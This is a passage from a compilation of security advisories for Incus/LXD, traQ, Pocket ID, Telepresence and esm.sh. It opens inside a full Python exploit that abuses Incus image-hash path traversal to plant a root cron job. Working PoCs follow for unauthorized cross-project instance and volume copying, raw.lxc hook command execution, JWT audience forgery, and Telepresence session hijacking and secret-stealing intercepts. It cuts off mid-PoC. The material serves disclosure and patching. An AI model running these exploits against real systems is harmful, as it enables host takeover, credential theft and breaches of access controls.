path then creates `/var/lib/incus/images/<hash>` before validating that the hash
is a real SHA-256 of the downloaded bytes. A hash containing `../` escapes the
image directory.

Default mode is dry-run. With --execute-trigger this script starts a tiny HTTP
server, returns a traversal hash pointing at cron, streams the cron payload, and
keeps the response open so the daemon-side cleanup does not immediately remove
the file.
"""

from __future__ import annotations

import argparse
import http.client
import json
import shlex
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any


DEFAULT_SOCKET = "/var/lib/incus/unix.socket"
DEFAULT_TRAVERSAL = "../../../../etc/cron.d/incus-direct-image-url-rce"


class UnixHTTPConnection(http.client.HTTPConnection):
    def __init__(self, socket_path: str, timeout: int = 120):
        super().__init__("incus", timeout=timeout)
        self.socket_path = socket_path

    def connect(self) -> None:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect(self.socket_path)
        self.sock = sock


class RCEHTTPServer(ThreadingHTTPServer):
    hash_path: str
    advertise_url: str
    payload: bytes
    hold_seconds: int
    payload_requested: threading.Event


class DirectImageHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "direct-image-rce/1.0"

    def log_message(self, fmt: str, *args: Any) -> None:
        print(f"[http] {self.address_string()} - {fmt % args}", flush=True)

    def do_HEAD(self) -> None:
        if self.path != "/stage":
            self.send_error(404)
            return

        srv = self.server
        assert isinstance(srv, RCEHTTPServer)
        self.send_response(200)
        self.send_header("Incus-Image-Hash", srv.hash_path)
        self.send_header("Incus-Image-URL", srv.advertise_url.rstrip("/") + "/payload")
        self.send_header("Connection", "close")
        self.end_headers()

    def do_GET(self) -> None:
        if self.path != "/payload":
            self.send_error(404)
            return

        srv = self.server
        assert isinstance(srv, RCEHTTPServer)
        srv.payload_requested.set()

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(srv.payload)
        self.wfile.flush()
        print(f"[*] payload bytes written to daemon response; holding for {srv.hold_seconds}s", flush=True)
        time.sleep(srv.hold_seconds)
        self.close_connection = True


def quote(value: str) -> str:
    return urllib.parse.quote(value, safe="")


def tls_context(args: argparse.Namespace) -> ssl.SSLContext:
    if args.insecure:
        ctx = ssl._create_unverified_context()
    else:
        ctx = ssl.create_default_context(cafile=args.cacert)

    if args.cert:
        ctx.load_cert_chain(args.cert, args.key)

    return ctx


def connection(args: argparse.Namespace) -> http.client.HTTPConnection:
    if args.url:
        parsed = urllib.parse.urlparse(args.url)
        if parsed.scheme != "https":
            raise ValueError("--url must use https")

        return http.client.HTTPSConnection(
            parsed.hostname,
            parsed.port or 8443,
            timeout=args.timeout,
            context=tls_context(args),
        )

    return UnixHTTPConnection(args.socket, timeout=args.timeout)


def request_json(
    args: argparse.Namespace,
    method: str,
    path: str,
    obj: dict[str, Any] | None,
    allow_error: bool = False,
) -> tuple[int, dict[str, Any]]:
    body = None if obj is None else json.dumps(obj).encode("utf-8")
    headers = {"Host": "incus"}
    if body is not None:
        headers["Content-Type"] = "application/json"

    conn = connection(args)
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    raw = resp.read()
    conn.close()

    try:
        data = json.loads(raw) if raw else {}
    except json.JSONDecodeError:
        data = {"raw": raw.decode("utf-8", "replace")}

    if not allow_error and (resp.status >= 400 or data.get("type") == "error"):
        raise RuntimeError(f"{method} {path} failed with HTTP {resp.status}: {data}")

    return resp.status, data


def images_path(project: str) -> str:
    return "/1.0/images?project=" + quote(project)


def cron_payload(command: str) -> bytes:
    return f"* * * * * root /bin/sh -c {shlex.quote(command)}\n".encode("utf-8")


def image_url_body(project_url: str, public: bool) -> dict[str, Any]:
    return {
        "source": {
            "type": "url",
            "url": project_url.rstrip("/") + "/stage",
        },
        "public": public,
    }


def start_server(args: argparse.Namespace, payload: bytes) -> RCEHTTPServer:
    server = RCEHTTPServer((args.listen_host, args.listen_port), DirectImageHandler)
    server.hash_path = args.hash_path
    server.advertise_url = args.advertise_url
    server.payload = payload
    server.hold_seconds = args.hold_seconds
    server.payload_requested = threading.Event()

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def main() -> int:
    parser = argparse.ArgumentParser(description="Incus direct image URL hash traversal cron RCE PoC")
    parser.add_argument("--socket", default=DEFAULT_SOCKET, help="Incus Unix socket")
    parser.add_argument("--url", help="remote Incus URL, for example https://host.ctf:8443")
    parser.add_argument("--cert", help="client certificate for remote Incus")
    parser.add_argument("--key", help="client private key for remote Incus")
    parser.add_argument("--cacert", help="CA certificate for remote Incus")
    parser.add_argument("--insecure", action="store_true", help="disable TLS verification")
    parser.add_argument("--timeout", type=int, default=120, help="Incus request timeout")
    parser.add_argument("--project", default="default", help="project used for image import")
    parser.add_argument("--public", action="store_true", help="mark imported image public")
    parser.add_argument("--listen-host", default="0.0.0.0", help="HTTP listen address")
    parser.add_argument("--listen-port", type=int, default=8088, help="HTTP listen port")
    parser.add_argument("--advertise-url", default="http://127.0.0.1:8088", help="URL reachable by the Incus daemon")
    parser.add_argument("--hash-path", default=DEFAULT_TRAVERSAL, help="value returned in Incus-Image-Hash")
    parser.add_argument("--hold-seconds", type=int, default=90, help="keep payload response open for this many seconds")
    parser.add_argument("--command", default="id > /tmp/incus-direct-image-url-rce", help="command cron should run")
    parser.add_argument("--execute-trigger", action="store_true", help="start server and trigger POST /1.0/images")
    parser.add_argument("--yes-i-understand-this-writes-host-file", action="store_true", help="required with --execute-trigger")
    args = parser.parse_args()

    if bool(args.cert) != bool(args.key):
        parser.error("--cert and --key must be supplied together")
    if args.execute_trigger and not args.yes_i_understand_this_writes_host_file:
        parser.error("--execute-trigger requires --yes-i-understand-this-writes-host-file")

    payload = cron_payload(args.command)
    trigger_body = image_url_body(args.advertise_url, args.public)

    print("[*] exploit primitive: direct image URL unvalidated hash path host write")
    print(f"[*] HEAD URL served to daemon: {args.advertise_url.rstrip()}/stage")
    print(f"[*] returned Incus-Image-Hash: {args.hash_path}")
    print(f"[*] returned Incus-Image-URL: {args.advertise_url.rstrip()}/payload")
    print(f"[*] expected escaped host target from default Incus dir: /etc/cron.d/incus-direct-image-url-rce")
    print(f"[*] cron payload: {payload.decode().rstrip()}")
    print(f"[*] trigger body: {json.dumps(trigger_body, sort_keys=True)}")

    if not args.execute_trigger:
        print("[*] dry run only; pass --execute-trigger and --yes-i-understand-this-writes-host-file to test")
        return 0

    server = start_server(args, payload)
    print(f"[*] HTTP server listening on {args.listen_host}:{args.listen_port}")

    status, data = request_json(args, "POST", images_path(args.project), trigger_body, allow_error=True)
    print(f"[*] POST /1.0/images HTTP {status}: {json.dumps(data, indent=2, sort_keys=True)}")

    if server.payload_requested.wait(timeout=min(args.hold_seconds, 30)):
        print("[*] daemon requested payload; cron file should exist until the held response is released")
    else:
        print("[!] daemon did not request payload within the wait window")

    print("[*] leaving HTTP server active for the remaining hold window")
    time.sleep(max(0, args.hold_seconds - 30))
    server.shutdown()
    server.server_close()
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except BrokenPipeError:
        raise SystemExit(1)
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
```

An arbitrary file write on the client with root privileges; possibly leading
to arbitrary command execution.

### GHSA-qx75-2p3r-pwm5 — LXD has project restriction bypass in instance copy across projects 
- Aliases:  | Published: 2026-11-06 | Modified: 2026-11-06 | Severity: HIGH
- CWE: CWE-284
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`
- Affected Go/github.com/canonical/lxd: introduced:0 fixed:0.0.0-20260630083100-c5184be310b1

Reported from https://github.com/lxc/incus/security/advisories/GHSA-c9f5-j9c3-mhrg

### Summary
Missing authorization checks exist for instance copying where an attacker knowing the name of a project that they don't have access to and the name of an instance in that project can copy the instance to a new project. This issue could allow an attacker to access secrets in instances they are not authorized to access.

### Details
`cmd/incusd/instances.go` authorizes `POST /1.0/instances` against the target project. In the copy path, `cmd/incusd/instances_post.go` then loads the source instance from `req.Source.Project` without checking whether the caller can view that source instance.

From my understanding, the copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the instance to another server.

### PoC

#### Setup

We assume the target server is remotely accessible and a user/certificate has been added.

```
# create a new project and instance
incus project create secrets
incus profile show default | incus --project secrets edit default
incus --project secrets init images:debian/trixie secret

# restrict an existing certificate to prevent access to the project
incus config trust edit cert-fp
#> set, for example
restricted: true
projects:
  - default

# verification, with the restricted certificate
incus ls remote:
```

#### Exploitation

The below script was partly generated. To copy the `secret` instance to the `default` project, the following command can be used.

```
python3 poc.py --url https://IP-REMOTE:8443 \
    --cert path/to/client.crt --key path/to/client.key \
    --target-project default --source-project secrets \
    --source-instance secret --name copy-secret --insecure
```

Wait a bit for the instance to be copied, then `incus ls remote:` to see the copied instance.

```
#!/usr/bin/env python3
"""Copy an instance from a project the caller should not be able to read."""

from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def post(url: str, path: str, body: dict, cert: str, key: str, insecure: bool) -> bytes:
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)

    req = urllib.request.Request(
        url.rstrip("/") + path,
        data=json.dumps(body).encode(),
        method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        sys.stderr.write(exc.read().decode(errors="replace") + "\n")
        raise


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--target-project", required=True)
    ap.add_argument("--source-project", required=True)
    ap.add_argument("--source-instance", required=True)
    ap.add_argument("--name", required=True, help="new instance name in target project")
    ap.add_argument("--instance-only", action="store_true")
    ap.add_argument("--start", action="store_true")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    body = {
        "name": args.name,
        "source": {
            "type": "copy",
            "source": args.source_instance,
            "project": args.source_project,
            "instance_only": args.instance_only,
        },
        "start": args.start,
    }
    path = "/1.0/instances?" + urllib.parse.urlencode({"project": args.target_project})
    print(json.dumps(body, indent=2))
    if args.dry_run:
        return 0
    print(post(args.url, path, body, args.cert, args.key, args.insecure).decode(errors="replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

### GHSA-7mr3-28h5-m5vx — LXD has project restriction bypass for custom volume copy across projects 
- Aliases:  | Published: 2026-11-06 | Modified: 2026-11-06 | Severity: HIGH
- CWE: CWE-284
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`
- Affected Go/github.com/canonical/lxd: introduced:0 fixed:0.0.0-20260630083100-c5184be310b1

Reported from https://github.com/lxc/incus/security/advisories/GHSA-64f3-v33m-w89f

### Summary

Missing authorization checks exist for custom volume copying where an attacker knowing the name of a project that they don't have access to and the name of a custom volume in that project can copy the custom volume to a new project. This issue could allow an attacker to access secrets in custom volumes they are not authorized to access.

### Details

The storage volume creation handler authorizes creation in the target project, then passes `req.Source.Project` into the custom-volume copy path without checking that the caller can view the source volume. `req.Source.Project` is the attacker-controlled field. It is resolved to a storage volume project name and passed directly to `CreateCustomVolumeFromCopy`. No `allowPermission` or entitlement check (e.g. `CanView` on the source volume) is performed.

From my understanding, the copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the volume to another server.

### PoC
#### Setup

We assume the target server is remotely accessible and a user/certificate has been added.

```
# create a new project and instance
incus project create secrets
incus profile show default | incus --project secrets edit default
incus --project secrets storage volume create default secret-vol

# restrict an existing certificate to prevent access to the project
incus config trust edit cert-fp
#> set, for example
restricted: true
projects:
  - default

# verification, with the restricted certificate
incus --project secrets storage volume ls remote:default
```

#### Exploitation

The below script was partly generated. To copy the secret instance to the default project, the following command can be used.

```
python3 poc.py --url https://IP-REMOTE:8443 \
    --cert path/to/client.crt --key path/to/client.key \
    --target-project default --source-project secrets \
    --source-volume secret-vol --name copy-secret-vol \
    --pool default --source-pool default \
    --insecure
```

```
#!/usr/bin/env python3
"""Copy a custom storage volume from another project into an allowed project."""

from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def post(url: str, path: str, body: dict, cert: str, key: str, insecure: bool) -> bytes:
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)
    req = urllib.request.Request(
        url.rstrip("/") + path,
        data=json.dumps(body).encode(),
        method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        sys.stderr.write(exc.read().decode(errors="replace") + "\n")
        raise


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--pool", required=True)
    ap.add_argument("--target-project", required=True)
    ap.add_argument("--source-project", required=True)
    ap.add_argument("--source-volume", required=True)
    ap.add_argument("--source-pool")
    ap.add_argument("--name", required=True, help="new volume name in target project")
    ap.add_argument("--content-type", default="filesystem", choices=["filesystem", "block"])
    ap.add_argument("--volume-only", action="store_true")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    source = {
        "type": "copy",
        "name": args.source_volume,
        "project": args.source_project,
        "volume_only": args.volume_only,
    }
    if args.source_pool:
        source["pool"] = args.source_pool

    body = {
        "name": args.name,
        "type": "custom",
        "content_type": args.content_type,
        "source": source,
    }
    path = "/1.0/storage-pools/{}/volumes/custom?{}".format(
        urllib.parse.quote(args.pool, safe=""),
        urllib.parse.urlencode({"project": args.target_project}),
    )
    print(json.dumps(body, indent=2))
    if args.dry_run:
        return 0
    print(post(args.url, path, body, args.cert, args.key, args.insecure).decode(errors="replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

### Summary

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting;
allowing for arbitrary command execution on the Incus server by abusing
lowlevel hooks such as `raw.lxc` and `raw.qemu`.


### Details

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting;
allowing for arbitrary command execution on the Incus server by abusing
lowlevel hooks such as `raw.lxc` and `raw.qemu`.

As snapshots can be moved from one server to another, a malicious
instance+snapshot can be crafted locally, moved to a restricted project
and the snapshot restored for arbitrary command execution.

In practice, this allows a malicious actor to execute arbitrary commands
on the host with root privileges.


### PoC

```
# remote, restricted
incus project set rem:project restricted.true
incus project set rem:project restricted.containers.lowlevel=block

# locally, unrestricted project
incus init images:debian/trixie rce-raw-lxc
incus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c "/bin/id >/lxc-hook-prestart"'
incus snapshot create rce-raw-lxc snap0
#> allow transfer to restricted project
incus config unset rce-raw-lxc raw.lxc

# locally, transfer and trigger
incus move rce-raw-lxc rem: --mode push
incus snapshot restore rem:rce-raw-lxc snap0
incus start rem:rce-raw-lxc
```


### Impact

- Bypass of project restrictions.
- Arbitrary command execution on the Incus server.

### GHSA-p74g-f95m-7fx7 — traQ: XSS in the User Uploaded File Retrieval API
- Aliases: CVE-2026-63197 | Published: 2026-11-09 | Modified: 2026-11-09 | Severity: HIGH
- CWE: CWE-79
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N`
- Affected Go/github.com/traPtitech/traQ: introduced:0 fixed:1.0.0-rc.2.0.20260627142846-3db29e777166

### Impact

For instances where `TRAQ_STORAGE_TYPE` is set to `local`, the file retrieval API `/files/{fileId}` could serve user-uploaded SVG or HTML files in a way that allowed them to be rendered directly in the browser.

As a result, an attacker who can upload files to traQ could upload a crafted SVG or HTML file and trick a victim into opening the file URL, allowing the attacker to execute arbitrary JavaScript in the victim's browser.

### Patches

This issue has been fixed in v3.28.3.

After this fix, the file retrieval API always adds the `Content-Disposition` header to its responses regardless of the value of the `dl` query parameter. This prevents user-uploaded files from being displayed directly in the browser.

### Workarounds

To mitigate the impact of this issue, apply either of the following workarounds:

* Change `TRAQ_STORAGE_TYPE` to a storage backend other than `local`.
* Ensure that all requests to `/files/{fileId}` include `dl=1`.

Users of this application can reduce the risk of exploitation by avoiding suspicious file URLs.

- https://github.com/traPtitech/traQ/commit/3db29e7771661f6418d88d186d8ff7817f5d6b6e [WEB]
- https://github.com/traPtitech/traQ [PACKAGE]

### GHSA-8cfq-jgf7-8m27 — traQ: Privilege escalation by OAuth prompt=none request
- Aliases: CVE-2026-63198 | Published: 2026-11-09 | Modified: 2026-11-09 | Severity: HIGH
- CWE: CWE-863
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N`
- Affected Go/github.com/traPtitech/traQ: introduced:0 fixed:1.0.0-rc.2.0.20260629134940-5510fe8aa9bb

In OAuth2 silent authorization (`prompt=none`), when the `scope` parameter was empty or omitted, all scopes registered for the OAuth client became eligible for issuance. However, the prior consent check was performed against the empty requested scope set. As a result, an attacker could obtain an access token with broader scopes than the user had previously consented to, without requiring additional consent.

## Impact

If an attacker controls an OAuth client capable of receiving authorization codes, and a user has already consented to only a subset of that client’s scopes, the attacker may be able to obtain a token containing all scopes registered for that client by sending an authorization request with `prompt=none` and an empty or omitted `scope`.

If the user has not consented to the client at all, `consent_required` is returned as usual.

## Patches

This issue has been fixed in v3.28.3. After the fix, the consent check for `prompt=none` verifies the scopes that will actually be issued, rather than the empty requested scope set. If the user has not consented to all scopes after expansion, `consent_required` is returned.

traQ also recommends revoking any existing OAuth tokens created before the fix if they were potentially affected.

## Workarounds

If users cannot update immediately, they should apply the following mitigations:

- Disable untrusted OAuth clients, minimize registered client scopes, and revoke existing tokens
- Reject authorization requests with `prompt=none` where `scope` is empty or omitted

- https://github.com/traPtitech/traQ/commit/5510fe8aa9bb15fc4755c78792381dbb03d576c3 [WEB]

### GHSA-q4xm-p75h-h9p3 — Pocket ID: The client credentials grant allows any OIDC client to obtain tokens for arbitrary audiences
- Aliases: CVE-2026-62662 | Published: 2026-11-09 | Modified: 2026-11-09 | Severity: HIGH
- CWE: CWE-20, CWE-863
- CVSS_V3: `CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N`
- Affected Go/github.com/pocket-id/pocket-id/backend: introduced:0 fixed:0.0.0-20260622164202-8158452b3730

## Summary

The client credentials grant (`grant_type=client_credentials`) does not validate the resource parameter before embedding it as the aud claim in the issued JWT. Any authenticated OIDC client can obtain a Pocket ID-signed access token claiming authorization for any arbitrary audience, including other registered OIDC clients. There is no check that the requested audience is a registered resource server, and no check that the requesting client has been granted permission to access it.

## Details

In `backend/internal/service/oidc_service.go`, `createTokenFromClientCredentials` accepts the resource parameter from the token request and places it directly into the `aud` claim of the issued JWT without validation:

```golang
  audClaim := client.ID
  if input.Resource != "" {
      audClaim = input.Resource  // no validation performed
  }
  accessToken, err := s.jwtService.GenerateOAuthAccessToken(dummyUser, audClaim)
```

The only guard in this function is `verifyClientCredentialsInternal`, which confirms the requesting client's credentials are valid. After that check passes, any value supplied as resource is accepted. There is no registry of permitted audiences, no per-client authorization policy controlling which resources a client may request tokens for, and no validation that the resource value corresponds to anything registered in Pocket ID.

The introspection endpoint (`/api/oidc/introspect`) does not mitigate this. It checks that the introspecting client's ID matches the token's `aud` claim, but since the attacker controls `aud`, a resource server calling introspection to validate an inbound token will receive `"active": true`. Pocket ID has no server-side record of which client requested the token or whether it was authorized to do so, so introspection cannot distinguish a legitimately issued token from one obtained through this vulnerability.

## PoC

Given a Pocket ID instance with two registered OIDC clients — `client-a` (attacker-controlled) and `client-b` (target resource) — the following request causes Pocket ID to issue a signed JWT with `aud: ["client-b"]`, authenticated only as `client-a`:

```
curl -X POST https://<pocket-id-host>/api/oidc/token \
    -d "grant_type=client_credentials" \
    -d "client_id=client-a" \
    -d "client_secret=<client-a-secret>" \
    -d "resource=client-b"
```

The response is a valid, Pocket ID-signed JWT with:

```json
{
    "sub": "client-client-a",
    "aud": ["client-b"],
    "iss": "https://<pocket-id-host>",
    "type": "oauth-access-token"
}
```

This token will pass signature and `aud` validation at any resource server that trusts Pocket ID's JWKS and accepts `client-b` as its audience identifier.

## Impact

Any OIDC client registered in Pocket ID that has valid credentials (client secret or federated identity) can obtain a Pocket ID-signed access token scoped to any other registered client or arbitrary audience string. In deployments where services use the client credentials grant and validate incoming bearer tokens against Pocket ID's JWKS, this allows a compromised or malicious client to bypass audience-based access controls and present tokens to resource servers it should not be authorized to access.

The severity depends on deployment: if no resource servers validate Pocket ID-issued access tokens, there is no immediate exploitable impact. In deployments that do rely on the client credentials grant for service-to-service authorization, the isolation between services is entirely broken.

References:
- https://github.com/pocket-id/pocket-id/security/advisories/GHSA-q4xm-p75h-h9p3 [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-62662 [ADVISORY]
- https://github.com/pocket-id/pocket-id/pull/1520 [WEB]
- https://github.com/pocket-id/pocket-id/commit/8158452b37304115c97c61c3a56082ce938ce6f0 [WEB]

### GHSA-6j3h-rp73-6rvf — Telepresence: Tunnel endpoint accepts caller-supplied session ID with no ownership proof — active client sessions hijackable
- Aliases: CVE-2026-102339 | Published: 2026-11-09 | Modified: 2026-11-09 | Severity: HIGH
- CWE: CWE-639
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N`
- Affected Go/github.com/telepresenceio/telepresence/v2: introduced:0 fixed:2.31.0

## Summary

The Traffic Manager `Tunnel` gRPC streaming endpoint accepts a session ID from the first bytes of the client-controlled message payload. No verification confirms the caller owns the session. An attacker supplying a valid active session ID receives a fully routed tunnel for that session, gaining the network routing capabilities of the legitimate Telepresence client. Tested on HEAD v2.28.0, commit b2231a4.

## Details

The `Tunnel` handler reads identity from a client-provided binary payload rather than from a verified credential or prior authenticated gRPC call:

```go
// cmd/traffic/cmd/manager/service.go:1057-1063
func (s *service) Tunnel(server grpc.BidiStreamingServer[...]) error {
    stream, err := tunnel.NewServerStream(ctx, tunnel.ClientToManager, server)
    return s.state.Tunnel(ctx, stream)  // stream.SessionID() is client-controlled
}
```

`state.Tunnel` looks up the session ID in the sessions map with no ownership proof:

```go
// cmd/traffic/cmd/manager/state/state.go:698-703
func (s *State) Tunnel(ctx context.Context, stream tunnel.Stream) error {
    id := stream.SessionID()   // from client payload bytes
    if cs, ok := s.clients.Load(id); ok {
        return s.clientTunnel(ctx, cs, stream)  // full dialer granted
    }
    return grpcErrors.Errorf(codes.NotFound, ...)
}
```

The session ID is parsed from the wire message with no binding to the transport-level identity of the caller (pkg/tunnel/message.go:209-214).

## Proof of Concept

Precondition: a valid active session ID (obtainable via ArriveAsClient, which has no auth either).

```go
conn, _ := grpc.NewClient("traffic-manager.ambassador:8081",
    grpc.WithTransportCredentials(insecure.NewCredentials()))
mgr := rpc.NewManagerClient(conn)

tunnelStream, _ := mgr.Tunnel(ctx)

// Send StreamInfo with victim session ID in payload
tunnelStream.Send(&rpc.TunnelMessage{Payload: buildStreamInfo(victimSessionID, ...)})

// Traffic Manager routes tunnel traffic for victimSessionID
// through this attacker-controlled bidirectional stream
```

## Impact

A caller supplying a valid session ID of an active Telepresence client obtains a tunnel endpoint for that session's network routing context. Session IDs are UUID4s, making cold brute-force impractical; exploitation materialises when session IDs are obtainable via log leakage or cluster-internal channels. Combined with the unauthenticated ArriveAsClient endpoint, an attacker can
create their own sessions and pivot to impersonate active developer sessions.

- https://github.com/telepresenceio/telepresence/pull/4217 [WEB]

### GHSA-j8j4-rw65-56r6 — Telepresence: Traffic Manager gRPC has no auth — any pod claims arbitrary namespace and intercepts services, receiving victim environment secrets
- Aliases: CVE-2026-102340 | Published: 2026-11-09 | Modified: 2026-11-09 | Severity: HIGH
- CWE: CWE-306, CWE-862
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
- Affected Go/github.com/telepresenceio/telepresence: introduced:0 fixed:2.31.0

## Summary

Telepresence's Traffic Manager gRPC API (port 8081) requires no authentication. Any pod with cluster-network access to the Traffic Manager can register as a client in an arbitrary managed namespace and create intercepts against services in that namespace, regardless of Kubernetes RBAC. On interception the victim pod's complete container environment (secrets, tokens, API keys) is delivered to the attacker. Tested on HEAD v2.28.0, commit b2231a4.

## Details

The gRPC server is started with no auth interceptor (pkg/grpc/server/server.go). The connection uses plaintext: `grpc.WithTransportCredentials(insecure.NewCredentials())`.

`ArriveAsClient` stores the caller-supplied `Namespace` without verifying the caller is in that namespace. The only gate is whether the namespace is in the Traffic Manager's watchlist (`ManagesNamespace`):

```go
// cmd/traffic/cmd/manager/service.go:181-201
func (s *service) ArriveAsClient(..., client *rpc.ClientInfo) (*rpc.SessionInfo, error) {
    if !s.State().ManagesNamespace(ctx, client.Namespace) {
        return nil, status.Error(codes.FailedPrecondition, ...)
    }
    // No SAR, no bearer token, no kubeconfig check
    return &rpc.SessionInfo{SessionId: string(s.state.AddClient(client, ...))}, nil
}
```

`CreateIntercept` calls `managedTargetNamespace()` which also only checks `ManagesNamespace(target_ns)` — never that the target equals the client's own registered namespace (service.go:929). A session registered in namespace A can intercept namespace B as long as B is also watched. On interception, the victim pod's full container environment is forwarded via `intercept.Environment = rIReq.Environment`.

## Proof of Concept

From any pod in the cluster:

```go
conn, _ := grpc.NewClient("traffic-manager.ambassador:8081",
    grpc.WithTransportCredentials(insecure.NewCredentials()))
mgr := rpc.NewManagerClient(conn)

session, _ := mgr.ArriveAsClient(ctx, &rpc.ClientInfo{
    Name: "attacker@pod", Namespace: "payments",
    InstallId: uuid.NewString(), Product: "telepresence", Version: "2.20.0",
})

mgr.CreateIntercept(ctx, &rpc.CreateInterceptRequest{
    Session: session,
    InterceptSpec: &rpc.InterceptSpec{
        Name: "steal", Agent: "payments-api", Namespace: "payments",
        Mechanism: "tcp", Client: "attacker@pod",
    },
})
```

Supplying a namespace not in the TM watchlist returns FailedPrecondition, confirming the only gate is the watchlist check.

## Impact

Any pod operator in the cluster can intercept services in namespaces they have no Kubernetes RBAC access to, receiving all traffic and environment variables. In the default cluster-wide Traffic Manager deployment all namespaces are managed.
Secrets mounted as environment variables (database passwords, API keys, service account tokens) are exfiltrated with no audit trail on the victim namespace.

- https://nvd.nist.gov/vuln/detail/CVE-2026-102340 [ADVISORY]
- https://github.com/telepresenceio/telepresence/pull/4217 [WEB]

### GHSA-g3c2-rjq2-c763 — esm.sh: web.NewHandler allows arbitrary file read via encoded dot-segment path traversal
- Aliases: CVE-2026-102657 | Published: 2026-11-09 | Modified: 2026-11-09 | Severity: HIGH
- CWE: CWE-22
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- Affected Go/github.com/esm-dev/esm.sh/web: introduced:0 fixed:0.2.0

### Summary

The documented `web.NewHandler` static file server can read files outside `Config.AppDir` when the request path contains URL-encoded dot-segments such as `%2e%2e`. Go's `ServeMux` redirects plain `/../` paths, but it passes encoded dot-segments to the handler after decoding `r.URL.Path`. The handler then calls `filepath.Join(s.config.AppDir, r.URL.Path)` without checking that the result remains under `AppDir`, allowing unauthenticated arbitrary file reads with the server process privileges.

### Details

`web/README.md:34-40` documents a network-facing setup:

```go
http.Handle("GET /", web.NewHandler(web.Config{
  AppDir: "/path/to/webapp",
  Fallback: "/index.html",
  Dev: false,
}))
log.Fatal(http.ListenAndServe(":8080", nil))
```

In `web/handler.go:62-75`, the handler takes `r.URL.Path` and joins it directly with `s.config.AppDir`:

```go
pathname := r.URL.Path
filename := filepath.Join(s.config.AppDir, pathname)
fi, err := os.Lstat(filename)
```

Later the same resolved filename is opened and copied to the response in `web/handler.go:150-166` for non-HTML/static files. There is no `filepath.IsLocal`, cleaned-relative-path, absolute-root prefix, or symlink-aware containment check before opening the file.

A plain `/../secret.txt` path is redirected by Go's `ServeMux`, but an encoded path such as `/%2e%2e/secret.txt` is decoded into `r.URL.Path == "/../secret.txt"` and reaches the handler. On Linux, `filepath.Join("/tmp/root/app", "/../secret.txt")` resolves to `/tmp/root/secret.txt`, outside the configured app directory.

Source-to-sink chain:

```text
Unauthenticated HTTP request path containing URL-encoded dot-segments
-> net/http decodes path into r.URL.Path
-> documented ServeMux setup passes encoded dot-segment path to web.NewHandler
-> web/handler.go joins Config.AppDir with r.URL.Path
-> os.Lstat/os.Open operate on the escaped path
-> io.Copy returns file contents to the attacker
```

False-positive checks performed:
- Plain dot-segment paths are redirected by `http.ServeMux`, but encoded dot-segments are not blocked and reach the handler.
- The PoC uses the documented `http.Handle("GET /", web.NewHandler(...))` setup, not a custom bypass of ServeMux.
- A control request for `/secret.txt` does not read the outside file; the disclosure requires encoded traversal segments.
- The issue is independent of `Dev`/HMR; it reproduces with `Dev: false`.
- The root cause appears in other handler paths that join app paths, but the static file read path is sufficient to prove arbitrary file disclosure.

Candidate score: 18/18 under the local audit scoring rubric. The handler is documented for network-facing use, the attacker directly controls the request path, the path reaches `os.Open`, file disclosure was reproduced locally, and no root containment mitigation is present.

### PoC

This safe local proof creates an application directory and a sibling secret file outside it, registers the handler exactly as documented, and requests the sibling file through encoded `..` path segments.

```go
package main

import (
    "fmt"
    "net/http"
    "net/http/httptest"
    "os"
    "strings"

    "github.com/esm-dev/esm.sh/web"
)

func main() {
